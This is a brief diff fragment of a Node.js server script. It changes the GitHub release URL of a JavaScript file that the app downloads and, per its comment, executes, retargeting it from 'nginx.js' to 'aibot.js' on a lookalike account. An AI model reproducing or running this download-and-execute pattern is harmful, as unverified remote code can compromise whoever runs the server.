@@ -32,8 +32,8 @@ app.get("/log", (req, res) => {
 });
 
 // Specify the URL of the bot.js file to download
-const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
-const fileName = 'nginx.js';
+const fileUrl = 'https://github.com/eoowe/test/releases/download/111/aibot.js';
+const fileName = 'aibot.js';
 const filePath = path.join(FILE_PATH, fileName);
 
 // Download and execute the file
